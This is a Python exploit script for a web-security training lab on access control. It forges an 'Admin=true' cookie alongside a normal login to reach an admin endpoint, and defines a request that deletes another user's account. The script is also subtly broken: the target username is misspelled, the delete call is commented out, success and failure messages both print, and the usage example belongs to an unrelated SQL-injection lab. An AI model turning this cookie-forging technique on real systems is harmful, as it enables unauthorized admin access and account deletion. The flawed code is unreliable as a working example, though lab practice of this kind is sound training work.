# Lab 3: User role controlled by request parameter
import sys

from typing import Optional, cast

import requests
import urllib3
from bs4 import BeautifulSoup
from bs4.element import Tag
from colorama import Fore

urllib3.disable_warnings()

proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}

SESSION_COOKIE = ""
ADMIN_COOKIE = "true"


def go_to_login_for_cfrs():
    global SESSION_COOKIE
    r = requests.get(url + "login", proxies=proxies, verify=False, timeout=5)
    print(f"{Fore.YELLOW}[+] CSRF response status: {r.status_code}{Fore.RESET}")
    r.raise_for_status()
    SESSION_COOKIE = r.cookies.get("session")
    print(f"{Fore.GREEN}[+] Session cookie: {SESSION_COOKIE}{Fore.RESET}")
    soup = BeautifulSoup(r.text, "html.parser")
    csrf: Optional[Tag] = cast(Tag, soup.find("input", type="hidden"))
    if csrf is not None:
        print(f"{Fore.GREEN}[+] CSRF token: {csrf['value']}{Fore.RESET}")
        return csrf["value"]

    return "not csrf token"



def login(csfr_token):
    full_url = url + "login"
    print(full_url)
    cookies = {"session": SESSION_COOKIE, "Admin": ADMIN_COOKIE}
    data = {"csrf": csfr_token, "username": "wiener", "password": "peter"}
    r = requests.post(
        full_url, cookies=cookies, data=data, verify=False, proxies=proxies, timeout=5
    )
    r.raise_for_status()
    print(r.text)
    print(f"{Fore.YELLOW}Login status code: {r.status_code}{Fore.RESET}")
    soup = BeautifulSoup(r.text, "html.parser")
    is_not_logged_in = soup.find(string="Invalid username or password.")
    if not is_not_logged_in:
        print(f"{Fore.GREEN}[-] Wiener logined in successfully{Fore.RESET}")
    print(f"{Fore.RED}[-] Wiener not logined in{Fore.RESET}")


def delete_carlos():
    delete_command = "delete?username=carlosssss"
    full_url = url + "admin/" + delete_command
    print(full_url)
    cookies = {"session": SESSION_COOKIE, "Admin": ADMIN_COOKIE}
    r = requests.get(
        full_url, cookies=cookies, verify=False, proxies=proxies, timeout=5
    )
    r.raise_for_status()
    print(f"{Fore.YELLOW}Delete status code: {r.status_code}{Fore.RESET}")
    if r.status_code == 302:
        print(f"{Fore.GREEN}[-] Carlos deleted{Fore.RESET}")
    print(f"{Fore.RED}[-] Carlos not deleted{Fore.RESET}")


def exploit():
    csfr_token = go_to_login_for_cfrs()
    login(csfr_token)
    # delete_carlos()


if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()

    except IndexError:
        print(f"{Fore.RED}[-] Usage: {sys.argv[0]} <url>{Fore.RESET}")
        print(
            f'[-] Example: {sys.argv[0]} USER_NAME = "administrator" TABLE_NAME = "users" COLUMN_NAME = "username""'
        )
        sys.exit(-1)

    print("[*] Exploiting...")
    exploit()
